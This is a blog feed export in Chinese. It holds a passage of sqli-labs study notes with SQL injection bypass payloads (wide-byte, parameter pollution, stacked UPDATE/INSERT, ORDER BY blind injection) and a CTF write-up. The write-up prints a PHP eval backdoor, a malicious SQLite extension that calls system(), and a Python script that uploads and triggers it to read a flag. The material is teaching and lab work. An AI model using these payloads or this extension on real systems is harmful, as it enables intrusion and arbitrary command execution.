SELECT&#x2F;UNION（大小写全覆盖）+ 去空格，需双写、大小写混合+括号绕过；</p></li><li><p>Less-28：先移除注释符与空格&#x2F;加号，再过滤 union\s+select（不区分大小写），SQL 为 id&#x3D;(‘$id’)；</p></li><li><p>Less-28a：仅过滤 union\s+select（不去空格&#x2F;注释），SQL 为 id&#x3D;(‘$id’)。</p></li></ul><h3 id="2-复现关键线索-4"><a href="#2-复现关键线索-4" class="headerlink" title="2. 复现关键线索"></a>2. 复现关键线索</h3><ul><li><p>Less-23（禁注释）：用语法闭合替代注释（如 ‘1’ OR 1&#x3D;1 ‘），使尾部单引号被闭合，语句合法；</p></li><li><p>Less-24（二次注入）：注册时用户名输入“admin’#”（被转义为 admin&#39;# 存入数据库），改密码时 session 读取用户名为 admin&#39;#，拼接入语句后注释掉后续内容，实现密码重置；</p></li><li><p>Less-25（过滤 OR&#x2F;AND）：用 anandd、oorr 双写，或 &amp;&amp;、|| 等价运算符，维持逻辑判断功能；</p></li><li><p>Less-26（过滤空格）：用括号包裹关键字（如 (select(1)from(users))），或非空白分隔符（%09）替代空格；</p></li><li><p>Less-27（过滤 UNION&#x2F;SELECT）：用 UniOnSelEcT 双写+大小写混合，搭配括号绕过过滤；</p></li><li><p>Less-28（过滤 union\s+select + 去空格&#x2F;注释）：换行会被 \s 匹配；可用 union(select…) 这类无空白写法绕过。</p></li><li><p>Less-28a（仅过滤 union\s+select）：可用注释或括号拆分关键字（如 union&#x2F;**&#x2F;select、union(select…)）绕过。</p></li></ul><hr><h1 id="模块六：WAF-与转义（WAF-Escaping）"><a href="#模块六：WAF-与转义（WAF-Escaping）" class="headerlink" title="模块六：WAF 与转义（WAF &#x2F; Escaping）"></a>模块六：WAF 与转义（WAF &#x2F; Escaping）</h1><p><strong>涉及关卡</strong>：Less-29 ~ Less-37</p><h2 id="一、核心操作逻辑-4"><a href="#一、核心操作逻辑-4" class="headerlink" title="一、核心操作逻辑"></a>一、核心操作逻辑</h2><p>此类关卡聚焦 WAF 绕过与字符转义漏洞，核心是利用解析差异、编码特性，突破 WAF 校验与转义函数的防御，触发注入。</p><ul><li><p><strong>HPP 绕过</strong>：利用 WAF 与后端服务器对多参数的解析差异，构造多个同名参数，使 WAF 校验合法参数，后端执行恶意参数。</p></li><li><p><strong>宽字节注入</strong>：在 GBK 编码环境下，利用多字节特性“吃掉”转义符（\），使单引号逃逸，突破 addslashes、mysqli_real_escape_string 的防御。</p></li></ul><h2 id="二、关键知识点-4"><a href="#二、关键知识点-4" class="headerlink" title="二、关键知识点"></a>二、关键知识点</h2><ul><li><p><strong>HPP（HTTP 参数污染）</strong>：不同服务端对多参数的处理逻辑不同，ASP.NET 接收所有值，PHP&#x2F;Apache 通常取最后一个值；WAF 若仅校验第一个参数，可构造 ?id&#x3D;1&amp;id&#x3D;evil，绕过 WAF 执行恶意注入。</p></li><li><p><strong>宽字节注入原理</strong>：GBK 编码中，部分双字节组合会被解析为汉字，如 %df（0xDF）+ \（0x5C）&#x3D; 汉字“ß”（0xDF5C）。转义函数会给单引号加 \（变为 &#39;），若数据库编码为 GBK，%df&#39; 会被解析为 ß’，单引号成功逃逸。</p></li><li><p><strong>转义函数局限性</strong>：addslashes、mysqli_real_escape_string 的防御效果依赖数据库连接字符集，若字符集不匹配（如前端 UTF-8、后端 GBK），易触发宽字节漏洞。</p></li></ul><h2 id="三、深度思考与拓展-5"><a href="#三、深度思考与拓展-5" class="headerlink" title="三、深度思考与拓展"></a>三、深度思考与拓展</h2><ul><li><p>解析顺序错位的风险：同一请求在 WAF、代理、应用服务器中的解析顺序不同，可能导致 WAF 认为合法，后端执行恶意代码（如 HPP、编码解析差异）；需梳理完整请求链路的解析规则，寻找绕过突破口。</p></li><li><p>字符集与转义的关系：mysqli_real_escape_string 会根据当前数据库连接字符集处理特殊字符，若连接字符集为 GBK，会对 \ 进行转义，但仍可被宽字节吃掉；若字符集为 UTF-8，宽字节注入失效。</p></li><li><p>历史防护手段的局限：魔术引号（magic_quotes_gpc）作为早期防御手段，仅对 GET、POST、Cookie 参数转义，无法覆盖 Header、日志等注入点，且在宽字节环境下失效，已被 PHP 废弃。</p></li></ul><h2 id="四、源码解析与复现要点-5"><a href="#四、源码解析与复现要点-5" class="headerlink" title="四、源码解析与复现要点"></a>四、源码解析与复现要点</h2><h3 id="1-源码结构与防御逻辑"><a href="#1-源码结构与防御逻辑" class="headerlink" title="1. 源码结构与防御逻辑"></a>1. 源码结构与防御逻辑</h3><ul><li><p>Less-29&#x2F;30&#x2F;31（WAF+HPP）：WAF 逻辑在 login.php 中，通过 java_implimentation() 取查询串里的第一个 id 并做纯数字白名单校验；后端实际使用 $_GET[‘id’]（通常取最后一个同名参数）拼接入 SQL，形成 HPP 绕过：</p><ul><li><p>Less-29：SQL 为 id&#x3D;’$id’（单引号闭合）；</p></li><li><p>Less-30：SQL 为 id&#x3D;”$id”（双引号闭合）；</p></li><li><p>Less-31：SQL 为 id&#x3D;(“$id”)（双引号+括号闭合）。</p></li></ul></li><li><p>Less-32：自定义 check_addslashes 处理 + SET NAMES gbk（宽字节前提）；</p></li><li><p>Less-33：addslashes 处理 + SET NAMES gbk（宽字节前提）；</p></li><li><p>Less-34：POST 表单，addslashes 处理 + SET NAMES gbk；</p></li><li><p>Less-37：POST 表单，mysqli_real_escape_string 处理 + SET NAMES gbk；</p></li><li><p>Less-35：SQL 为 id&#x3D;$id（数值型），addslashes 对数值型无效；</p></li><li><p>Less-36：SQL 为 id&#x3D;’$id’（字符串），mysqli_real_escape_string + GBK 仍可触发宽字节绕过。</p></li></ul><h3 id="2-复现关键线索-5"><a href="#2-复现关键线索-5" class="headerlink" title="2. 复现关键线索"></a>2. 复现关键线索</h3><ul><li><p>Less-29（HPP 绕过）：在 login.php 构造 URL ?id&#x3D;1&amp;id&#x3D;’ OR 1&#x3D;1 #，WAF 校验第一个 id&#x3D;1 合法，后端执行第二个恶意参数触发注入；</p></li><li><p>Less-32（宽字节）：构造注入语句 %df’ OR 1&#x3D;1 #，转义后变为 %df&#39;，GBK 编码下解析为 ß’，单引号逃逸，语句合法；</p></li><li><p>Less-35（数值型转义失效）：直接输入 id&#x3D;1 OR 1&#x3D;1，无需闭合引号，转义函数不影响数值型参数，语句正常执行，回显所有数据。</p></li></ul><hr><h1 id="模块七：堆叠注入（Stacked-Injection）"><a href="#模块七：堆叠注入（Stacked-Injection）" class="headerlink" title="模块七：堆叠注入（Stacked Injection）"></a>模块七：堆叠注入（Stacked Injection）</h1><p><strong>涉及关卡</strong>：Less-38 ~ Less-45</p><h2 id="一、核心操作逻辑-5"><a href="#一、核心操作逻辑-5" class="headerlink" title="一、核心操作逻辑"></a>一、核心操作逻辑</h2><p>堆叠注入通过分号（;）分隔多条 SQL 语句，使后端同时执行多个语句，核心前提是后端使用支持多语句执行的函数（如 mysqli_multi_query），可实现插入、更新、删除等高危操作。</p><ul><li><p><strong>可行性验证</strong>：先执行延时语句（如 ; SELECT sleep(5)），观察响应时间，判断后端是否支持多语句执行。</p></li><li><p><strong>权限利用</strong>：堆叠注入可执行非查询语句，需结合数据库权限，实现数据篡改（UPDATE）、权限提升（CREATE USER）、表删除（DROP TABLE）等操作。</p></li></ul><h2 id="二、关键知识点-5"><a href="#二、关键知识点-5" class="headerlink" title="二、关键知识点"></a>二、关键知识点</h2><ul><li><p><strong>多语句执行函数</strong>：MySQL 中 mysqli_multi_query 支持多语句执行，mysqli_query 仅执行第一条语句；PDO 需开启 ATTR_EMULATE_PREPARES 才能支持多语句，默认禁用。</p></li><li><p><strong>结果集特性</strong>：后端通常仅读取第一条语句的结果集，后续语句虽执行但无回显，需通过间接方式（如数据变化、日志）验证执行效果。</p></li><li><p><strong>权限限制</strong>：堆叠注入的危害依赖数据库权限，若应用账户仅拥有查询权限，无法执行 UPDATE、DROP 等高危语句，需遵循最小权限原则防御。</p></li></ul><h2 id="三、深度思考与拓展-6"><a href="#三、深度思考与拓展-6" class="headerlink" title="三、深度思考与拓展"></a>三、深度思考与拓展</h2><ul><li><p>生产环境禁用多语句的原因：多语句执行会大幅扩大注入危害，从数据泄露升级为数据篡改、系统瘫痪；应用侧误开启多语句的场景包括：使用 mysqli_multi_query 替代 mysqli_query、配置不当允许多语句执行。</p></li><li><p>堆叠注入与常规注入的风险边界：常规注入多局限于查询语句，堆叠注入可执行任意 SQL 语句，风险覆盖数据泄露、篡改、销毁，且难以通过回显监控；需结合数据库审计、权限管控防御。</p></li><li><p>驱动差异影响：不同数据库驱动对多语句的支持不同，如 ODBC 部分版本支持多语句，JDBC 需配置 allowMultiQueries&#x3D;true 才能开启，需针对驱动特性调整注入策略。</p></li></ul><h2 id="四、源码解析与复现要点-6"><a href="#四、源码解析与复现要点-6" class="headerlink" title="四、源码解析与复现要点"></a>四、源码解析与复现要点</h2><h3 id="1-源码结构-4"><a href="#1-源码结构-4" class="headerlink" title="1. 源码结构"></a>1. 源码结构</h3><ul><li><p>Less-38 ~ Less-41（GET 堆叠）：均使用 mysqli_multi_query 执行 SQL，手动建立数据库连接，SQL 闭合方式不同：<br>后端仅读取第一条语句结果集，后续语句后台执行。</p><ul><li><p>Less-38：id&#x3D;’$id’（单引号）；</p></li><li><p>Less-39：id&#x3D;$id（数值型）；</p></li><li><p>Less-40：id&#x3D;(‘$id’)（单引号+括号）；</p></li><li><p>Less-41：id&#x3D;$id（数值型）。</p></li></ul></li><li><p>Less-42 ~ Less-45（POST 堆叠）：登录流程分散在多个文件，login.php 使用 mysqli_multi_query 执行 SQL，用户名经 mysqli_real_escape_string 过滤，密码字段未过滤，为堆叠注入入口；通过 Auth Cookie 和 session 维持登录态，可触发后续改密、重置功能。</p></li></ul><h3 id="2-复现关键线索-6"><a href="#2-复现关键线索-6" class="headerlink" title="2. 复现关键线索"></a>2. 复现关键线索</h3><ul><li><p>Less-38（GET 堆叠）：构造注入语句 ‘; UPDATE users SET password&#x3D;’123456’ WHERE username&#x3D;’admin’; #，执行后通过登录验证密码是否修改，验证堆叠效果；</p></li><li><p>Less-42（POST 堆叠）：密码字段输入 ‘; INSERT INTO users (username,password) VALUES (‘test’,’test’); #，登录成功后执行插入语句，通过数据库查询验证新用户是否创建。</p></li></ul><hr><h1 id="模块八：ORDER-BY-注入"><a href="#模块八：ORDER-BY-注入" class="headerlink" title="模块八：ORDER BY 注入"></a>模块八：ORDER BY 注入</h1><p><strong>涉及关卡</strong>：Less-46 ~ Less-53</p><h2 id="一、核心操作逻辑-6"><a href="#一、核心操作逻辑-6" class="headerlink" title="一、核心操作逻辑"></a>一、核心操作逻辑</h2><p>ORDER BY 注入针对排序字段，核心特点是无法直接使用 Union 查询，需通过报错、布尔差异（排序结果变化）判断注入条件真假，提取数据。</p><ul><li><p><strong>报错注入方式</strong>：在 ORDER BY 后构造非法语法（如 rand(true)、updatexml 函数），触发数据库报错，泄露数据。</p></li><li><p><strong>盲注方式</strong>：利用 IF 函数构造条件排序（如 ORDER BY IF(cond, username, password)），通过排序结果（如用户名顺序变化）判断条件真假，逐字符遍历数据。</p></li></ul><h2 id="二、关键知识点-6"><a href="#二、关键知识点-6" class="headerlink" title="二、关键知识点"></a>二、关键知识点</h2><ul><li><p><strong>ORDER BY 语法限制</strong>：排序字段可直接写列名、表达式或数字（代表查询结果的列索引），无法直接拼接 Union 查询，需借助其他函数触发信息泄露。</p></li><li><p><strong>排序结果判断</strong>：布尔盲注的核心是建立稳定的排序信号，如以某列数据的升降序变化，作为条件真假的判断依据，避免因数据重复导致误判。</p></li><li><p><strong>白名单防御</strong>：若排序字段被白名单限制（仅允许指定列名），注入面会大幅收缩，需通过列名枚举、别名构造等方式突破。</p></li></ul><h2 id="三、深度思考与拓展-7"><a href="#三、深度思考与拓展-7" class="headerlink" title="三、深度思考与拓展"></a>三、深度思考与拓展</h2><ul><li><p>ORDER BY 适合布尔信号的原因：排序结果直接影响页面展示（如表格数据顺序），信号直观且稳定；但无法直接回显数据，需逐字符遍历，效率低于报错注入。</p></li><li><p>白名单限制的突破思路：若排序字段支持别名（如 SELECT username AS u FROM users ORDER BY u），可尝试构造别名注入；或寻找未被白名单覆盖的排序表达式（如函数结果排序）。</p></li><li><p>安全设计方案：排序字段应使用服务器端枚举映射（如接收 1&#x2F;2 代表 username&#x2F;password），避免直接将用户输入作为排序字段；标识符（列名&#x2F;表名）无法参数化时，需严格校验输入，仅允许合法值。</p></li></ul><h2 id="四、源码解析与复现要点-7"><a href="#四、源码解析与复现要点-7" class="headerlink" title="四、源码解析与复现要点"></a>四、源码解析与复现要点</h2><h3 id="1-源码结构-5"><a href="#1-源码结构-5" class="headerlink" title="1. 源码结构"></a>1. 源码结构</h3><ul><li><p>输入参数：通过 $_GET[‘sort’] 获取排序字段，多数页面会写入当前目录 result.txt（记录通常是过滤后的值）。</p></li><li><p>核心 SQL 语句：</p><ul><li><p>数值型排序：Less-46&#x2F;48&#x2F;50&#x2F;52：SELECT * FROM users ORDER BY $id；</p></li><li><p>字符型排序：Less-47&#x2F;49&#x2F;51&#x2F;53：SELECT * FROM users ORDER BY ‘$id’。</p></li></ul></li><li><p>执行与回显：Less-46<del>49 使用 mysqli_query（错误直接回显）；Less-50</del>53 使用 mysqli_multi_query（支持堆叠，仅展示第一条结果集）；页面固定输出 users 表数据，通过排序顺序差异构造盲注信号。</p></li></ul><h3 id="2-复现关键线索-7"><a href="#2-复现关键线索-7" class="headerlink" title="2. 复现关键线索"></a>2. 复现关键线索</h3><ul><li><p>Less-46（数值型报错）：构造 sort&#x3D;rand(updatexml(1,concat(0x7e,user(),0x7e),1))，触发 XML 报错，泄露当前数据库用户；</p></li><li><p>Less-48（盲注）：构造 sort&#x3D;IF(ascii(substr((select username from users limit 0,1),1,1))&#x3D;97, username, password)，若用户名首字符为 ‘a’（ASCII 97），则按 username 排序，否则按 password 排序，通过页面数据顺序判断条件真假。</p></li></ul><hr><h1 id="模块九：Challenges（实战模拟）"><a href="#模块九：Challenges（实战模拟）" class="headerlink" title="模块九：Challenges（实战模拟）"></a>模块九：Challenges（实战模拟）</h1><p><strong>涉及关卡</strong>：Less-54 ~ Less-65</p><h2 id="一、核心操作逻辑-7"><a href="#一、核心操作逻辑-7" class="headerlink" title="一、核心操作逻辑"></a>一、核心操作逻辑</h2><p>实战模拟关卡的核心特点是环境动态化（随机表名&#x2F;列名）与资源受限（请求次数限制），需结合前序模块的注入技巧，制定高效策略，在有限次数内获取目标数据（secret 字段）。</p><ul><li><p><strong>高效信息收集</strong>：优先通过报错注入一次性获取表名、列名等结构信息，避免逐字符盲注浪费请求次数。</p></li><li><p><strong>盲注优化</strong>：请求次数紧张时，采用二分法遍历，减少请求量；利用批量比较、并发请求提升效率。</p></li></ul><h2 id="二、关键知识点-7"><a href="#二、关键知识点-7" class="headerlink" title="二、关键知识点"></a>二、关键知识点</h2><ul><li><p><strong>动态环境适配</strong>：每次重置关卡会随机生成表名（如 challenges_xxxx）和 secret 列名（如 secret_xxxx），需先查询 information_schema 元数据，获取目标表&#x2F;列名，再提取数据。</p></li><li><p><strong>请求次数管控</strong>：每关在源码中通过 $times 控制次数：Less-54 为 10，Less-55<del>57 为 14，Less-58</del>61 为 5，Less-62~65 为 130；超限会清空 Cookie 并重置环境，需规划查询步骤，优先获取核心信息（表名→列名→secret 数据）。</p></li><li><p><strong>元数据查询优化</strong>：information_schema 表数据量大，高频查询效率低，可通过 LIMIT 限制结果集，或缓存查询结果，减少重复请求。</p></li></ul><h2 id="三、深度思考与拓展-8"><a href="#三、深度思考与拓展-8" class="headerlink" title="三、深度思考与拓展"></a>三、深度思考与拓展</h2><ul><li><p>动态表名&#x2F;列名的信息收集顺序：优先查询 information_schema.tables 获取 challenges 库下的随机表名，再查询 information_schema.columns 获取该表的 secret 列名，最后提取 secret 数据，避免无意义遍历。</p></li><li><p>最小可行信息集定义：在请求次数限制下，核心信息为“目标表名+secret 列名”，无需枚举所有表&#x2F;列；若无法报错注入，需用最少请求获取表名、列名的长度与首字符，逐步缩小范围。</p></li><li><p>自动化脚本设计：脚本需支持动态获取表&#x2F;列名、二分法盲注、失败重试、请求频率控制，应对速率限制与环境重置；同时需处理噪声（如网络抖动、页面渲染差异），确保数据准确性。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> SQL </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF 解题笔记：基于 PDO/Sqlite 扩展加载绕过 disable_functions</title>
      <link href="/2026/01/26/CTF%E8%A7%A3%E9%A2%98%E7%AC%94%E8%AE%B0-PDO-Sqlite%E6%89%A9%E5%B1%95%E5%8A%A0%E8%BD%BD%E7%BB%95%E8%BF%87disable_functions/"/>
      <url>/2026/01/26/CTF%E8%A7%A3%E9%A2%98%E7%AC%94%E8%AE%B0-PDO-Sqlite%E6%89%A9%E5%B1%95%E5%8A%A0%E8%BD%BD%E7%BB%95%E8%BF%87disable_functions/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-解题笔记：基于-PDO-Sqlite-扩展加载绕过-disable-functions"><a href="#CTF-解题笔记：基于-PDO-Sqlite-扩展加载绕过-disable-functions" class="headerlink" title="CTF 解题笔记：基于 PDO&#x2F;Sqlite 扩展加载绕过 disable_functions"></a>CTF 解题笔记：基于 PDO&#x2F;Sqlite 扩展加载绕过 disable_functions</h1><h2 id="一、-题目环境分析"><a href="#一、-题目环境分析" class="headerlink" title="一、 题目环境分析"></a>一、 题目环境分析</h2><ol><li><p><strong>入口代码</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cdcas&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>这是一个简单的后门，允许我们执行任意 PHP 代码。</li><li>经过测试，虽然可以使用 <code>phpinfo()</code>，但执行系统命令（如 <code>system(&quot;ls&quot;)</code>）时会提示函数被禁用或无回显，说明开启了 <code>disable_functions</code> 和可能的 <code>open_basedir</code> 限制。</li></ul></li><li><p><strong>目标</strong>：</p><ul><li>在不能使用 <code>system</code>、<code>exec</code>、<code>shell_exec</code> 等函数的情况下，执行系统命令。</li><li>找到并读取 Flag 文件。</li></ul></li></ol><h2 id="二、-攻击思路选择"><a href="#二、-攻击思路选择" class="headerlink" title="二、 攻击思路选择"></a>二、 攻击思路选择</h2><p>参考文档 <code>最新版 PHP 绕 open_basedir 和 disable_functions.pdf</code>，利用 PHP 的 <strong>PDO SQLite 扩展</strong>加载恶意 <code>.so</code> 文件的技术。</p><ul><li><strong>原理</strong>：<code>disable_functions</code> 只能禁用 PHP 解释器层面的函数。通过 <code>Pdo\Sqlite::loadExtension()</code> 加载恶意的 C 语言扩展，可以在 C 语言层面直接调用系统的 <code>system()</code> 函数，从而绕过 PHP 的限制。</li></ul><h2 id="三、-漏洞利用步骤"><a href="#三、-漏洞利用步骤" class="headerlink" title="三、 漏洞利用步骤"></a>三、 漏洞利用步骤</h2><h3 id="1-编写恶意-C-扩展代码-expolit-c"><a href="#1-编写恶意-C-扩展代码-expolit-c" class="headerlink" title="1. 编写恶意 C 扩展代码 (expolit.c)"></a>1. 编写恶意 C 扩展代码 (<code>expolit.c</code>)</h3><p>我们需要编写一个 SQLite 扩展，它在被加载时，读取一个包含命令的文件并执行。</p><p><strong>关键代码逻辑</strong>：</p><ul><li>定义入口函数 <code>sqlite3_exploit_init</code>。</li><li>读取 <code>/var/www/html/1.txt</code> (注意路径，详见下文) 中的命令。</li><li>调用 <code>system()</code> 执行该命令。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sqlite3ext.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">SQLITE_EXTENSION_INIT1</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN32</span></span><br><span class="line">__declspec(dllexport)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sqlite3_exploit_init</span><span class="params">(</span></span><br><span class="line"><span class="params">  sqlite3 *db,</span></span><br><span class="line"><span class="params">  <span class="type">char</span> **pzErrMsg,</span></span><br><span class="line"><span class="params">  <span class="type">const</span> sqlite3_api_routines *pApi</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">  SQLITE_EXTENSION_INIT2(pApi);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// [重要] 必须使用绝对路径或正确的相对路径</span></span><br><span class="line">  <span class="comment">// 初版尝试使用 /tmp/1.txt 失败，可能是因为 open_basedir 限制或权限问题</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *command_file_path = <span class="string">&quot;/var/www/html/1.txt&quot;</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="type">char</span> command_buffer[<span class="number">512</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  FILE *file_handle;</span><br><span class="line"></span><br><span class="line">  file_handle = fopen(command_file_path, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (file_handle == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> SQLITE_OK;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fgets(command_buffer, <span class="keyword">sizeof</span>(command_buffer), file_handle) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">      command_buffer[<span class="built_in">strcspn</span>(command_buffer, <span class="string">&quot;\r\n&quot;</span>)] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strlen</span>(command_buffer) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">          system(command_buffer);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  fclose(file_handle);</span><br><span class="line">  <span class="keyword">return</span> SQLITE_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-编译-SO-文件"><a href="#2-编译-SO-文件" class="headerlink" title="2. 编译 SO 文件"></a>2. 编译 SO 文件</h3><p>由于编译器提示缺少头文件 <code>sqlite3ext.h</code>，需要先安装依赖库。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装 SQLite 开发包</span></span><br><span class="line"><span class="built_in">sudo</span> apt-get install libsqlite3-dev</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编译为共享库</span></span><br><span class="line">gcc -fPIC -shared expolit.c -o exploit.so -lsqlite3</span><br></pre></td></tr></table></figure><h3 id="3-传输-Payload-的策略"><a href="#3-传输-Payload-的策略" class="headerlink" title="3. 传输 Payload 的策略"></a>3. 传输 Payload 的策略</h3><p>由于 <code>exploit.so</code> 是二进制文件，无法直接通过 URL 传输。采用了 <strong>Base64 编码 + PHP 写入</strong> 的方式。</p><ol><li>将 <code>exploit.so</code> 转为 Base64 字符串：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">base64</span> -w 0 exploit.so &gt; payload.txt</span><br></pre></td></tr></table></figure></li><li>由于 Base64 字符串非常长（20KB+），直接在 Burp Suite 中容易因换行符或长度限制导致 PHP <code>Parse Error</code>。</li><li><strong>解决方案</strong>：编写 Python 脚本，利用 <code>requests</code> 库发送 POST 请求，确保 Base64 字符串被正确传输和还原。</li></ol><h3 id="4-编写攻击脚本-attack-py"><a href="#4-编写攻击脚本-attack-py" class="headerlink" title="4. 编写攻击脚本 (attack.py)"></a>4. 编写攻击脚本 (<code>attack.py</code>)</h3><p>这个脚本负责将 SO 文件和命令文件写入服务器，并触发扩展加载。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://8.130.81.46:33845/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取并处理 Base64，去除换行符</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;payload.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    base64_so = f.read().replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造 PHP Payload</span></span><br><span class="line">php_code = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">$base64_so = \&quot;<span class="subst">&#123;base64_so&#125;</span>\&quot;;</span></span><br><span class="line"><span class="string">// 1. 将 SO 写入当前目录</span></span><br><span class="line"><span class="string">file_put_contents(\&quot;exploit.so\&quot;, base64_decode($base64_so));</span></span><br><span class="line"><span class="string">// 2. 将命令写入当前目录 (注意路径必须与 C 代码中一致)</span></span><br><span class="line"><span class="string">file_put_contents(\&quot;1.txt\&quot;, \&quot;cat /flag_cdcas &gt; result.txt\&quot;);</span></span><br><span class="line"><span class="string">// 3. 初始化 SQLite 并加载扩展</span></span><br><span class="line"><span class="string">$db = new Pdo\\Sqlite(&#x27;sqlite:memory:&#x27;);</span></span><br><span class="line"><span class="string">$db-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);</span></span><br><span class="line"><span class="string">$db-&gt;loadExtension(&#x27;exploit.so&#x27;);</span></span><br><span class="line"><span class="string">// 4. 读取执行结果</span></span><br><span class="line"><span class="string">echo file_get_contents(\&quot;result.txt\&quot;);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">response = requests.post(url, data=&#123;<span class="string">&quot;cdcas&quot;</span>: php_code&#125;)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><h2 id="四、-遇到的坑与排查"><a href="#四、-遇到的坑与排查" class="headerlink" title="四、 遇到的坑与排查"></a>四、 遇到的坑与排查</h2><ol><li><p><strong>文件路径陷阱</strong>：</p><ul><li><strong>现象</strong>：报错 <code>No such file or directory</code> 或无回显。</li><li><strong>原因</strong>：C 代码中硬编码了 <code>/tmp/1.txt</code>，但环境可能对 <code>/tmp</code> 有写入限制或权限隔离。</li><li><strong>解决</strong>：改用 Web 根目录 <code>/var/www/html/</code>（当前目录 <code>./</code>），这是必定可写的路径。同时修改 C 代码并重新编译。</li></ul></li><li><p><strong>PHP 语法错误</strong>：</p><ul><li><strong>现象</strong>：<code>Parse error: syntax error, unexpected end of file</code>。</li><li><strong>原因</strong>：Base64 字符串中包含了换行符，导致 PHP 认为字符串提前结束。</li><li><strong>解决</strong>：使用 Python 脚本生成 Payload，避免手动粘贴。</li></ul></li><li><p><strong>Flag 路径未知</strong>：</p><ul><li><strong>现象</strong>：执行 <code>cat /flag</code> 无回显。</li><li><strong>原因</strong>：Flag 文件不在 <code>/flag</code>，而是重命名了。</li><li><strong>解决</strong>：修改脚本中的命令为 <code>ls -la /</code>，发现根目录下有一个名为 <code>flag_cdcas</code> 的文件。随后修改命令为 <code>cat /flag_cdcas</code>。</li></ul></li></ol><h2 id="五、-最终执行与获取-Flag"><a href="#五、-最终执行与获取-Flag" class="headerlink" title="五、 最终执行与获取 Flag"></a>五、 最终执行与获取 Flag</h2><ol><li>修改 <code>attack.py</code> 中的命令为 <code>ls 